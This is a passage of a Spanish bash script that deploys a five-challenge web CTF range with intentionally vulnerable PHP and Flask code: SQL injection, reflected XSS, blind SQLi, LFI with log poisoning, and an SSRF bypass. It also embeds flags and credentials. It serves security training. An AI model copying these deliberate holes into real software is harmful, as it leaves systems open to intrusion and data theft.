#!/bin/bash
# =============================================================================
# CTF MGP — DESPLIEGUE MAESTRO: 5 Retos Web
# Ubuntu Server 24.04 LTS  |  Apache 2.4 + PHP 8.3 + MySQL 8 + Flask
# Ejecutar: sudo bash deploy_web_MAESTRO.sh
# Resultado esperado: 24/24 controles OK
# =============================================================================
set -e

VERDE="\e[32m"; AMARILLO="\e[33m"; ROJO="\e[31m"
AZUL="\e[34m"; NEGRITA="\e[1m"; RESET="\e[0m"

[ "$EUID" -ne 0 ] && { echo -e "${ROJO}Ejecutar como root: sudo bash $0${RESET}"; exit 1; }

echo -e "${AZUL}${NEGRITA}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   CTF MGP — Deploy Maestro Web (5 retos)                    ║"
echo "║   Ubuntu 24.04 LTS  |  Ejecución única                      ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

PHP_VER=$(php -r 'echo PHP_MAJOR_VERSION.".".PHP_MINOR_VERSION;' 2>/dev/null || echo "8.3")
TOKEN_SSRF="MGP2026-IAM-xK9mN3pQ7rT1vY5wZ8"
PYTHON_BIN=$(which python3)

# =============================================================================
# PASO 1 — DEPENDENCIAS
# =============================================================================
echo -e "${AMARILLO}[1/9] Instalando dependencias...${RESET}"
apt-get update -qq
apt-get install -y -qq \
    apache2 php libapache2-mod-php php-mysql php-curl \
    mysql-server curl iptables \
    python3-flask \
    hashcat john 2>/dev/null || true

systemctl enable apache2 mysql
systemctl start  apache2 mysql
echo -e "${VERDE}    [OK] Dependencias instaladas${RESET}"

# =============================================================================
# PASO 2 — APACHE: configuración base
# =============================================================================
echo -e "${AMARILLO}[2/9] Configurando Apache...${RESET}"

# Limpiar puertos extra (solo 80 y 443)
cat > /etc/apache2/ports.conf <<'EOF'
Listen 80

<IfModule ssl_module>
    Listen 443
</IfModule>
<IfModule mod_gnutls.c>
    Listen 443
</IfModule>
EOF

# Deshabilitar sites extra que puedan causar conflictos
for SITE in /etc/apache2/sites-enabled/*.conf; do
    BASENAME=$(basename "$SITE")
    [ "$BASENAME" != "000-default.conf" ] && \
        a2dissite "$BASENAME" 2>/dev/null || true
done

# Habilitar módulos necesarios
a2enmod rewrite "php${PHP_VER}" 2>/dev/null || a2enmod rewrite 2>/dev/null || true

# VirtualHost default con AllowOverride All
cat > /etc/apache2/sites-available/000-default.conf <<'EOF'
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    <Directory /var/www/html>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog  ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
EOF

a2ensite 000-default.conf 2>/dev/null || true

# CRÍTICO: open_basedir vacío en php.ini de Apache
# (permite LFI fuera de /var/www/html)
PHP_INI="/etc/php/${PHP_VER}/apache2/php.ini"
[ -f "$PHP_INI" ] && sed -i 's|^open_basedir\s*=.*|open_basedir =|' "$PHP_INI"

# Eliminar cualquier .htaccess con php_admin_value que cause HTTP 500
rm -f /var/www/html/lfi/.htaccess 2>/dev/null || true

systemctl restart apache2
sleep 1
echo -e "${VERDE}    [OK] Apache configurado${RESET}"

# =============================================================================
# PASO 3 — MYSQL: bases de datos para R1 y R3
# =============================================================================
echo -e "${AMARILLO}[3/9] Creando bases de datos...${RESET}"

mysql -u root <<'SQLEOF'
-- ── Reto 1: sqli_db ──────────────────────────────────────────────────────
CREATE DATABASE IF NOT EXISTS sqli_db CHARACTER SET utf8mb4;
CREATE USER IF NOT EXISTS 'ctf_sqli'@'localhost' IDENTIFIED BY 'Ctf$qliP4ss2026!';
GRANT SELECT ON sqli_db.* TO 'ctf_sqli'@'localhost';
FLUSH PRIVILEGES;
USE sqli_db;
DROP TABLE IF EXISTS users;
CREATE TABLE users (
    id       INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(60)  NOT NULL,
    password VARCHAR(100) NOT NULL,
    role     VARCHAR(30)  DEFAULT 'user'
);
INSERT INTO users (username, password, role) VALUES
('operador1', 'Op3r@dor2026!',                     'user'),
('operador2', 'Sup3rS3cur3Pass',                   'user'),
('soporte',   'Sop0rt3MGP#2025',                   'user'),
('logistica', 'L0g1st1c4Naval',                    'user'),
('admin',     'Comciberdef{sqli_bypass_2026_ok}',   'admin');

-- ── Reto 3: blind_db ─────────────────────────────────────────────────────
CREATE DATABASE IF NOT EXISTS blind_db CHARACTER SET utf8mb4;
CREATE USER IF NOT EXISTS 'ctf_blind'@'localhost' IDENTIFIED BY 'Bl1ndCTF$2026!';
GRANT SELECT ON blind_db.* TO 'ctf_blind'@'localhost';
FLUSH PRIVILEGES;
USE blind_db;
DROP TABLE IF EXISTS articles;
CREATE TABLE articles (
    id      INT AUTO_INCREMENT PRIMARY KEY,
    title   VARCHAR(200) NOT NULL,
    content TEXT,
    author  VARCHAR(80),
    visible TINYINT DEFAULT 1
);
INSERT INTO articles (title, content, author) VALUES
('Nuevo protocolo de seguridad perimetral',
 'El comando ha aprobado nuevas medidas de seguridad en los accesos principales.',
 'Teniente Rodriguez'),
('Ejercicio UNITAS 2026 — Informe preliminar',
 'Las fuerzas navales completaron con éxito la primera fase del ejercicio.',
 'Capitán Flores'),
('Actualización de sistemas de comunicaciones',
 'Se renovaron los equipos de comunicación satelital.',
 'Teniente Comandante Vega'),
('Mantenimiento programado — Escuadrón 3',
 'El mantenimiento preventivo se realizará el próximo mes.',
 'Mayor Castillo'),
('Informe de ciberseguridad Q1 2026',
 'Se detectaron y neutralizaron 47 intentos de intrusión.',
 'Coronel Saenz');
DROP TABLE IF EXISTS moderators;
CREATE TABLE moderators (
    id            INT AUTO_INCREMENT PRIMARY KEY,
    username      VARCHAR(60) NOT NULL,
    password_hash VARCHAR(64) NOT NULL,
    clearance     VARCHAR(20) DEFAULT 'NIVEL-2'
);
INSERT INTO moderators (username, password_hash, clearance) VALUES
('mod_garcia', MD5('Temporal123'),   'NIVEL-1'),
('mod_torres', MD5('Sistemas456'),   'NIVEL-1'),
('paco_admin', MD5('NavalCiber2026'),'NIVEL-3'),
('mod_reyes',  MD5('Logistica789'),  'NIVEL-2');
SQLEOF

echo -e "${VERDE}    [OK] sqli_db y blind_db creadas${RESET}"

# =============================================================================
# PASO 4 — RETO 1: SQL Injection Login
# =============================================================================
echo -e "${AMARILLO}[4/9] Desplegando Reto 1 — SQLi Login...${RESET}"
mkdir -p /var/www/html/sqli-login

cat > /var/www/html/sqli-login/index.php <<'PHPEOF'
<?php
session_start();
$conn = new mysqli('localhost','ctf_sqli','Ctf$qliP4ss2026!','sqli_db');
if ($conn->connect_error) die("Error de conexion");
mysqli_report(MYSQLI_REPORT_OFF);
$error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'] ?? '';
    $pass = $_POST['password'] ?? '';
    // VULNERABLE: concatenación directa
    $sql    = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";
    $result = $conn->query($sql);
    if ($result && $result->num_rows > 0) {
        $row = $result->fetch_assoc();
        header("Location: dashboard.php?flag=".urlencode($row['password']));
        exit;
    } else { $error = 'Credenciales incorrectas. Acceso denegado.'; }
}
?><!DOCTYPE html><html lang="es"><head><meta charset="UTF-8">
<title>COMCIBERDEF — Portal de Agentes</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0f1e;color:#c9d1d9;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#161b27;border:1px solid #1f6feb;border-radius:10px;padding:40px 36px;width:360px;box-shadow:0 8px 32px rgba(0,100,255,.15)}
.logo{text-align:center;margin-bottom:28px}.logo h1{font-size:20px;color:#58a6ff;letter-spacing:2px;font-weight:700}
.logo p{font-size:11px;color:#8b949e;margin-top:4px;letter-spacing:1px}
label{font-size:12px;color:#8b949e;display:block;margin-bottom:6px;margin-top:16px}
input{width:100%;background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:10px 12px;color:#e6edf3;font-size:14px;outline:none}
input:focus{border-color:#58a6ff}
.btn{width:100%;margin-top:24px;padding:11px;background:#1f6feb;border:none;border-radius:6px;color:#fff;font-size:14px;font-weight:600;cursor:pointer}
.btn:hover{background:#388bfd}
.error{background:#3d1a1a;border:1px solid #f85149;color:#f85149;border-radius:6px;padding:10px 14px;font-size:13px;margin-top:16px}
.footer{text-align:center;font-size:11px;color:#484f58;margin-top:20px}</style></head>
<body><div class="card"><div class="logo"><h1>&#9632; COMCIBERDEF</h1><p>PORTAL INTERNO — SOLO PERSONAL AUTORIZADO</p></div>
<form method="POST">
<label>Usuario de Red</label><input type="text" name="username" placeholder="ej. operador1" autocomplete="off" required>
<label>Contraseña</label><input type="password" name="password" placeholder="••••••••" required>
<button type="submit" class="btn">Iniciar Sesión</button>
<?php if($error): ?><div class="error"><?=htmlspecialchars($error)?></div><?php endif; ?>
</form>
<div class="footer">Acceso registrado y auditado — MGP 2026</div></div></body></html>
PHPEOF

cat > /var/www/html/sqli-login/dashboard.php <<'PHPEOF'
<?php session_start(); $flag=$_GET['flag']??''; $user=$_SESSION['user']??'admin'; ?>
<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><title>COMCIBERDEF — Panel</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{background:#0a0f1e;color:#c9d1d9;font-family:'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#161b27;border:1px solid #238636;border-radius:10px;padding:40px 36px;width:480px;text-align:center}
h2{color:#3fb950;margin-bottom:12px;font-size:22px}
.flag-box{background:#0d1117;border:2px solid #3fb950;border-radius:8px;padding:18px 24px;font-family:monospace;font-size:16px;color:#3fb950;word-break:break-all;margin:20px 0}
.back{display:inline-block;margin-top:24px;color:#58a6ff;font-size:13px;text-decoration:none}</style></head>
<body><div class="card"><h2>&#10003; Acceso Concedido</h2>
<div class="label" style="font-size:11px;color:#484f58;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px">Flag del reto</div>
<div class="flag-box"><?=htmlspecialchars($flag)?></div>
<a class="back" href="index.php">&#8592; Volver al login</a></div></body></html>
PHPEOF

chown -R www-data:www-data /var/www/html/sqli-login
chmod -R 750 /var/www/html/sqli-login
echo -e "${VERDE}    [OK] Reto 1 desplegado${RESET}"

# =============================================================================
# PASO 5 — RETO 2: XSS Reflejado (puerto 80, path /xss/)
# =============================================================================
echo -e "${AMARILLO}[5/9] Desplegando Reto 2 — XSS Reflejado...${RESET}"
mkdir -p /var/www/html/xss

cat > /var/www/html/xss/index.php <<'PHPEOF'
<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8">
<title>Fast-Ship Rastreo</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{background:#f4f6f8;font-family:sans-serif;color:#1a1a2e}
header{background:#1a1a2e;color:#fff;padding:16px 40px;display:flex;align-items:center;gap:16px}
header h1{font-size:22px;font-weight:700}header span{font-size:12px;color:#a0aec0}
.hero{background:#16213e;color:#fff;padding:60px 40px;text-align:center}
.hero h2{font-size:28px;margin-bottom:12px}.hero p{color:#a0aec0;margin-bottom:28px}
.search-box{display:flex;max-width:500px;margin:0 auto}
.search-box input{flex:1;padding:13px 16px;border:none;border-radius:8px 0 0 8px;font-size:14px;outline:none}
.search-box button{padding:13px 22px;background:#e94560;color:#fff;border:none;border-radius:0 8px 8px 0;cursor:pointer;font-weight:600}
footer{text-align:center;padding:18px;color:#a0aec0;font-size:12px;border-top:1px solid #e2e8f0}</style>
</head><body>
<header><div><h1>Fast-Ship</h1><span>Logistica y Rastreo Internacional</span></div></header>
<div class="hero"><h2>Rastrea tu paquete en tiempo real</h2>
<p>Ingresa el numero de guia o nombre del remitente</p>
<form class="search-box" action="search.php" method="GET">
<input type="text" name="query" placeholder="Numero de guia...">
<button type="submit">Buscar</button></form></div>
<footer>Fast-Ship Logistics 2026</footer></body></html>
PHPEOF

cat > /var/www/html/xss/search.php <<'PHPEOF'
<?php
header("Set-Cookie: session_flag=Comciberdef{xss_reflected_2026_found}; path=/");
$query = $_GET['query'] ?? '';
// VULNERABLE: echo sin htmlspecialchars
?><!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><title>Fast-Ship Resultados</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{background:#f4f6f8;font-family:sans-serif;color:#1a1a2e}
header{background:#1a1a2e;color:#fff;padding:16px 40px;display:flex;align-items:center;justify-content:space-between}
header h1{font-size:20px;font-weight:700}
.container{max-width:700px;margin:40px auto;padding:0 20px}
.box{background:#fff;border-radius:10px;padding:28px;box-shadow:0 2px 10px rgba(0,0,0,.07)}
.box h2{font-size:17px;margin-bottom:8px}
.echo{background:#edf2f7;border-left:4px solid #e94560;padding:12px 16px;margin:14px 0}
.msg{color:#718096;font-size:14px;margin-top:12px}
.back{display:inline-block;margin-top:20px;color:#e94560;font-size:14px;text-decoration:none}</style>
</head><body>
<header><h1>Fast-Ship</h1><a href="index.php" style="color:#a0aec0;font-size:13px;text-decoration:none">Volver</a></header>
<div class="container"><div class="box">
<h2>Resultados de busqueda</h2>
<p style="font-size:13px;color:#718096">Buscaste:</p>
<div class="echo"><?php echo $query; ?></div>
<div class="msg">No se encontraron resultados.</div>
<a class="back" href="index.php">Nueva busqueda</a>
</div></div></body></html>
PHPEOF

chown -R www-data:www-data /var/www/html/xss
chmod 755 /var/www/html/xss
chmod 644 /var/www/html/xss/*.php
echo -e "${VERDE}    [OK] Reto 2 desplegado${RESET}"

# =============================================================================
# PASO 6 — RETO 3: SQLi Ciega Booleana
# =============================================================================
echo -e "${AMARILLO}[6/9] Desplegando Reto 3 — SQLi Ciega...${RESET}"
mkdir -p /var/www/html/sqli-blind

cat > /var/www/html/sqli-blind/index.php <<'PHPEOF'
<?php
$conn = new mysqli('localhost','ctf_blind','Bl1ndCTF$2026!','blind_db');
if ($conn->connect_error) die("Error de sistema");
mysqli_report(MYSQLI_REPORT_OFF);
$conn->query("SET SESSION sql_mode=''");
$id = $_GET['id'] ?? '';
$found = false; $article = [];
$list_res = $conn->query("SELECT id, title FROM articles WHERE visible=1 ORDER BY id");
$articles = [];
while ($row = $list_res->fetch_assoc()) $articles[] = $row;
if ($id !== '') {
    $sql = "SELECT id, title, content, author FROM articles WHERE id = $id AND visible = 1";
    $result = @$conn->query($sql);
    if ($result && $result->num_rows > 0) { $found = true; $article = $result->fetch_assoc(); }
}
?><!DOCTYPE html><html lang="es"><head><meta charset="UTF-8">
<title>COMCIBERDEF — Portal de Noticias</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{background:#f7f8fa;font-family:'Segoe UI',sans-serif;color:#1a202c}
header{background:#1a365d;color:#fff;padding:14px 32px;display:flex;align-items:center;justify-content:space-between}
header h1{font-size:18px;font-weight:700;letter-spacing:1px}header span{font-size:11px;color:#90cdf4}
.layout{display:flex;min-height:calc(100vh - 52px)}
.sidebar{width:260px;background:#fff;border-right:1px solid #e2e8f0;padding:20px;flex-shrink:0}
.sidebar h3{font-size:12px;text-transform:uppercase;letter-spacing:1px;color:#718096;margin-bottom:12px}
.sidebar a{display:block;padding:8px 10px;border-radius:6px;color:#2d3748;font-size:13px;text-decoration:none;margin-bottom:4px}
.sidebar a:hover,.sidebar a.active{background:#ebf8ff;color:#2b6cb0}
.main{flex:1;padding:32px}.card{background:#fff;border-radius:10px;padding:28px;box-shadow:0 1px 6px rgba(0,0,0,.06)}
.found{border-left:4px solid #38a169}.found h2{font-size:20px;margin-bottom:8px;color:#1a365d}
.found .meta{font-size:12px;color:#718096;margin-bottom:16px}
.found .body{font-size:14px;line-height:1.7;color:#4a5568}
.not-found{border-left:4px solid #e53e3e;text-align:center;padding:40px}
.not-found p{color:#718096;font-size:14px}
.status{display:inline-block;padding:4px 10px;border-radius:20px;font-size:11px;font-weight:600;letter-spacing:.5px;margin-bottom:20px}
.ok{background:#f0fff4;color:#276749;border:1px solid #9ae6b4}
.err{background:#fff5f5;color:#c53030;border:1px solid #feb2b2}</style></head>
<body>
<header><h1>&#128240; COMCIBERDEF — Portal de Noticias</h1><span>CLASIFICADO: USO INTERNO</span></header>
<div class="layout">
<div class="sidebar"><h3>Artículos disponibles</h3>
<?php foreach($articles as $a): ?>
<a href="?id=<?=(int)$a['id']?>" class="<?=($id==$a['id'])?'active':''?>">
<?=htmlspecialchars(substr($a['title'],0,38)).(strlen($a['title'])>38?'...':'')?></a>
<?php endforeach; ?></div>
<div class="main">
<?php if($id===''): ?>
<div class="card"><p style="color:#718096;font-size:14px">Selecciona un artículo o usa <code>?id=</code> en la URL.<br><br><em>Nota para desarrolladores: El módulo de filtrado por ID está en revisión.</em></p></div>
<?php elseif($found): ?>
<div class="card found"><div class="status ok">&#10003; Artículo encontrado</div>
<h2><?=htmlspecialchars($article['title'])?></h2>
<div class="meta">Autor: <?=htmlspecialchars($article['author'])?></div>
<div class="body"><?=htmlspecialchars($article['content'])?></div></div>
<?php else: ?>
<div class="card not-found"><div class="status err">Artículo no disponible</div>
<p>El artículo con ID <strong><?=htmlspecialchars($id)?></strong> no existe o no está disponible.</p></div>
<?php endif; ?>
</div></div></body></html>
PHPEOF

chown -R www-data:www-data /var/www/html/sqli-blind
chmod -R 750 /var/www/html/sqli-blind

# Wordlist para cracking
mkdir -p /home/rangeadmin
cat > /home/rangeadmin/wordlist.txt <<'EOF'
password
123456
admin
letmein
qwerty
military
naval
marina
peru2026
mgp2026
comciberdef
ciberdefensa
defensa2026
NavalCiber2026
Temporal123
Sistemas456
Logistica789
password123
abc123
dragon
master
welcome
shadow
sunshine
football
baseball
pass123
EOF
chown rangeadmin:rangeadmin /home/rangeadmin/wordlist.txt 2>/dev/null || true
chmod 644 /home/rangeadmin/wordlist.txt
echo -e "${VERDE}    [OK] Reto 3 desplegado${RESET}"

# =============================================================================
# PASO 7 — RETO 4: LFI + Log Poisoning → RCE
# =============================================================================
echo -e "${AMARILLO}[7/9] Desplegando Reto 4 — LFI...${RESET}"
mkdir -p /var/www/html/lfi/pages
mkdir -p /var/log/app

# Log de aplicación
touch /var/log/app/access.log
chown www-data:www-data /var/log/app/access.log
chmod 666 /var/log/app/access.log

printf '[2026-01-15 08:12:04] 192.168.125.40 GET /lfi/?page=home "Mozilla/5.0 (Windows NT 10.0)" 200\n' \
    > /var/log/app/access.log
printf '[2026-01-15 09:02:11] 192.168.125.1  GET /lfi/?page=admin "python-requests/2.28" 404\n' \
    >> /var/log/app/access.log

# Flag
echo "Comciberdef{lfi_log_poison_rce_2026}" > /flag.txt
chmod 444 /flag.txt
chown root:root /flag.txt

# Páginas de contenido normales
cat > /var/www/html/lfi/pages/home.php <<'PHPEOF'
<div class="content-area">
<h2>Sistema de Gestión de Accesos</h2>
<p>Bienvenido al portal de logs de acceso. Selecciona una sección del menú.</p>
</div>
PHPEOF

cat > /var/www/html/lfi/pages/news.php <<'PHPEOF'
<div class="content-area">
<h2>Novedades del Sistema</h2>
<p>v2.3.1 — Actualización de módulo de logging implementada el 15/01/2026.</p>
<p style="margin-top:8px">Los registros se almacenan en <code>/var/log/app/access.log</code> con formato extendido.</p>
<p style="margin-top:8px;color:#f87171"><strong>Aviso:</strong> El visor de logs está en mantenimiento. Acceder directamente si es necesario.</p>
</div>
PHPEOF

cat > /var/www/html/lfi/pages/contact.php <<'PHPEOF'
<div class="content-area">
<h2>Contacto — Soporte Técnico</h2>
<p>Incidentes: soporte@comciberdef.mil.pe</p>
<p style="margin-top:8px">Horario: Lunes a Viernes, 08:00 – 18:00</p>
</div>
PHPEOF

# CRÍTICO: index.php SIN ini_set (causa HTTP 500 en PHP 8.3)
# open_basedir ya está vacío en php.ini de Apache
cat > /var/www/html/lfi/index.php <<'PHPEOF'
<?php
error_reporting(0);
ini_set('display_errors', 0);

$log_file = '/var/log/app/access.log';
$ip   = $_SERVER['REMOTE_ADDR']     ?? '0.0.0.0';
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? '-';
$uri  = $_SERVER['REQUEST_URI']     ?? '/';
$page = $_GET['page']               ?? '';
$ts   = date('Y-m-d H:i:s');

// *** LOG POISONING: User-Agent escrito sin sanitizar ***
$entry = "[$ts] $ip GET $uri \"$ua\" 200\n";
@file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);

// *** LFI VULNERABLE: include() directo sin restricciones ***
if ($page !== '') { @include($page); }
?><!DOCTYPE html><html lang="es"><head><meta charset="UTF-8">
<title>COMCIBERDEF Log Viewer v2.3.1</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{background:#1a1a2e;color:#c9d1d9;font-family:sans-serif;min-height:100vh}
header{background:#16213e;border-bottom:2px solid #0f3460;padding:14px 32px;display:flex;align-items:center;gap:16px}
header h1{font-size:17px;color:#e94560;font-weight:700}header span{font-size:11px;color:#718096;margin-left:auto}
.layout{display:flex;min-height:calc(100vh - 52px)}
.sidebar{width:200px;background:#16213e;border-right:1px solid #0f3460;padding:18px}
.sidebar h3{font-size:10px;text-transform:uppercase;letter-spacing:1px;color:#718096;margin-bottom:10px}
.sidebar a{display:block;padding:8px 10px;border-radius:5px;color:#a0aec0;font-size:13px;text-decoration:none;margin-bottom:3px}
.sidebar a:hover,.sidebar a.active{background:#0f3460;color:#fff}
.main{flex:1;padding:24px}
.content-area{background:#16213e;border:1px solid #0f3460;border-radius:8px;padding:24px;line-height:1.7}
.content-area h2{color:#e94560;margin-bottom:12px;font-size:17px}
.content-area p{color:#a0aec0;font-size:14px;margin-bottom:8px}
.content-area code{background:#0f3460;padding:2px 5px;border-radius:3px;font-family:monospace;color:#63b3ed;font-size:12px}
.meta{font-size:11px;color:#4a5568;margin-top:20px;padding-top:10px;border-top:1px solid #0f3460}</style>
</head><body>
<header><h1>COMCIBERDEF Log Viewer v2.3.1</h1><span>SISTEMA INTERNO</span></header>
<div class="layout">
<div class="sidebar"><h3>Navegacion</h3>
<a href="?page=pages/home.php"    class="<?=($page==='pages/home.php')?'active':''?>">Inicio</a>
<a href="?page=pages/news.php"    class="<?=($page==='pages/news.php')?'active':''?>">Novedades</a>
<a href="?page=pages/contact.php" class="<?=($page==='pages/contact.php')?'active':''?>">Soporte</a>
<div style="margin-top:20px;padding-top:14px;border-top:1px solid #0f3460">
<h3>Sistema</h3><a href="?page=pages/home.php">Ver Logs</a></div></div>
<div class="main">
<?php if($page===''): ?>
<div class="content-area"><h2>Bienvenido</h2>
<p>Selecciona del menu o usa <code>?page=</code></p>
<p style="margin-top:10px">Logs en: <code>/var/log/app/access.log</code></p></div>
<?php endif; ?>
<div class="meta">Log: <?=htmlspecialchars($log_file)?> | IP: <?=htmlspecialchars($ip)?></div>
</div></div></body></html>
PHPEOF

chown -R www-data:www-data /var/www/html/lfi
chmod -R 750 /var/www/html/lfi
echo -e "${VERDE}    [OK] Reto 4 desplegado${RESET}"

# =============================================================================
# PASO 8 — RETO 5: SSRF + Bypass de Filtros
# =============================================================================
echo -e "${AMARILLO}[8/9] Desplegando Reto 5 — SSRF...${RESET}"
mkdir -p /opt/ctf-ssrf /var/www/html/ssrf/public

# Flask metadata service (:8888)
cat > /opt/ctf-ssrf/metadata_service.py <<PYEOF
#!/usr/bin/env python3
from flask import Flask, jsonify, Response
import datetime
app = Flask(__name__)
TOKEN = "${TOKEN_SSRF}"

@app.route('/')
def index():
    return Response("latest/\n  meta-data/\n    iam/\n      security-credentials/\n", mimetype='text/plain')

@app.route('/latest/meta-data/')
def meta():
    return Response("ami-id\ninstance-id\niam/\nlocal-ipv4\n", mimetype='text/plain')

@app.route('/latest/meta-data/iam/')
def iam():
    return Response("security-credentials/\n", mimetype='text/plain')

@app.route('/latest/meta-data/iam/security-credentials/')
def creds_list():
    return Response("mgp-role\n", mimetype='text/plain')

@app.route('/latest/meta-data/iam/security-credentials/mgp-role')
def creds():
    return jsonify({"Code":"Success","LastUpdated":datetime.datetime.utcnow().isoformat()+"Z",
        "Type":"AWS-HMAC","AccessKeyId":"AKIAMGP2026EXAMPLE",
        "SecretAccessKey":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","Token":TOKEN,
        "Expiration":"2026-12-31T23:59:59Z",
        "Note":"Usa el campo Token como Bearer en el servicio de storage interno"})

@app.route('/latest/meta-data/local-ipv4')
def local_ip():
    return Response("192.168.125.150\n", mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888, debug=False)
PYEOF

# Flask storage service (:9999)
cat > /opt/ctf-ssrf/storage_service.py <<PYEOF
#!/usr/bin/env python3
from flask import Flask, request, Response
app = Flask(__name__)
TOKEN = "${TOKEN_SSRF}"
FLAG  = "Comciberdef{ssrf_bypass_2026_master}"

@app.route('/')
def index():
    return Response("Internal Storage Service\n  /secret/flag.txt [AUTH REQUIRED]\n  /public/readme.txt [PUBLIC]\n", mimetype='text/plain')

@app.route('/public/readme.txt')
def readme():
    return Response("Sistema de almacenamiento interno COMCIBERDEF.\nRecursos clasificados requieren token IAM válido.\n", mimetype='text/plain')

@app.route('/secret/flag.txt')
def flag():
    auth = request.headers.get('Authorization','')
    if not auth.startswith('Bearer '):
        return Response("401 Unauthorized\nSe requiere: Authorization: Bearer <token>\n", status=401, mimetype='text/plain')
    if auth.replace('Bearer ','').strip() != TOKEN:
        return Response("403 Forbidden — token invalido.\n", status=403, mimetype='text/plain')
    return Response("=== DOCUMENTO CLASIFICADO ===\n\n"+FLAG+"\n\nAcceso registrado: "+request.remote_addr+"\n", mimetype='text/plain')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9999, debug=False)
PYEOF

chmod +x /opt/ctf-ssrf/metadata_service.py /opt/ctf-ssrf/storage_service.py

# Servicios systemd
cat > /etc/systemd/system/ctf-metadata.service <<SVCEOF
[Unit]
Description=CTF SSRF Metadata :8888
After=network.target
[Service]
Type=simple
User=www-data
WorkingDirectory=/opt/ctf-ssrf
ExecStart=${PYTHON_BIN} /opt/ctf-ssrf/metadata_service.py
Restart=always
RestartSec=3
Environment=PYTHONPATH=/usr/lib/python3/dist-packages
StandardOutput=journal
StandardError=journal
[Install]
WantedBy=multi-user.target
SVCEOF

cat > /etc/systemd/system/ctf-storage.service <<SVCEOF
[Unit]
Description=CTF SSRF Storage :9999
After=network.target
[Service]
Type=simple
User=www-data
WorkingDirectory=/opt/ctf-ssrf
ExecStart=${PYTHON_BIN} /opt/ctf-ssrf/storage_service.py
Restart=always
RestartSec=3
Environment=PYTHONPATH=/usr/lib/python3/dist-packages
StandardOutput=journal
StandardError=journal
[Install]
WantedBy=multi-user.target
SVCEOF

systemctl daemon-reload
systemctl enable ctf-metadata ctf-storage
systemctl restart ctf-metadata; sleep 2
systemctl restart ctf-storage;  sleep 2

# iptables: bloquear acceso externo a 8888 y 9999
iptables -I INPUT -i lo -p tcp --dport 8888 -j ACCEPT 2>/dev/null || true
iptables -I INPUT -i lo -p tcp --dport 9999 -j ACCEPT 2>/dev/null || true
iptables -A INPUT -p tcp --dport 8888 ! -i lo -j DROP 2>/dev/null || true
iptables -A INPUT -p tcp --dport 9999 ! -i lo -j DROP 2>/dev/null || true

# Portal PHP SSRF
cat > /var/www/html/ssrf/index.php <<'PHPEOF'
<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><title>NavalConnect — Previsualizador</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{background:#0f172a;color:#e2e8f0;font-family:sans-serif;min-height:100vh}
header{background:#1e293b;border-bottom:1px solid #334155;padding:16px 36px;display:flex;align-items:center;gap:14px}
header h1{font-size:20px;color:#38bdf8;font-weight:700}header p{font-size:12px;color:#64748b;margin-left:auto}
.container{max-width:820px;margin:48px auto;padding:0 24px}
.card{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:36px}
h2{font-size:18px;margin-bottom:8px;color:#f1f5f9}.desc{font-size:13px;color:#64748b;margin-bottom:28px;line-height:1.6}
.form-row{display:flex}
.form-row input{flex:1;background:#0f172a;border:1px solid #334155;border-radius:8px 0 0 8px;padding:12px 16px;color:#e2e8f0;font-size:14px;outline:none}
.form-row button{padding:12px 24px;background:#0284c7;color:#fff;border:none;border-radius:0 8px 8px 0;cursor:pointer;font-size:14px;font-weight:600}
.notice{margin-top:24px;background:#1e3a5f;border:1px solid #1e40af;border-radius:8px;padding:14px 18px;font-size:12px;color:#93c5fd}
.footer{text-align:center;margin-top:40px;font-size:11px;color:#475569}</style>
</head><body>
<header><h1>&#127758; NavalConnect</h1><p>Red Social Interna — Previsualizador v1.4.2</p></header>
<div class="container"><div class="card">
<h2>Previsualizar recurso externo</h2>
<p class="desc">Pega la URL de cualquier recurso para obtener una vista previa.</p>
<form action="preview.php" method="GET"><div class="form-row">
<input type="text" name="url" placeholder="https://recurso.ejemplo.com/doc" required>
<button type="submit">&#128269; Previsualizar</button></div></form>
<div class="notice"><strong>Aviso:</strong> Se bloquea el acceso a IPs internas (localhost, 127.0.0.1, 192.168.x.x).</div>
</div><div class="footer">NavalConnect &copy; 2026 — COMCIBERDEF</div></div></body></html>
PHPEOF

cat > /var/www/html/ssrf/preview.php <<'PHPEOF'
<?php
$url=$_GET['url']??'';
$blacklist=['localhost','127.0.0.1','::1','192.168.','10.','172.16.','172.17.'];
$blocked=false;
foreach($blacklist as $b){if(stripos($url,$b)!==false){$blocked=true;break;}}
$result='';$error='';$success=false;$http_code=0;
if($url&&!$blocked){
    $ch=curl_init($url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_TIMEOUT,5);
    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,true);curl_setopt($ch,CURLOPT_MAXREDIRS,3);
    curl_setopt($ch,CURLOPT_USERAGENT,'NavalConnect-Preview/1.4.2');
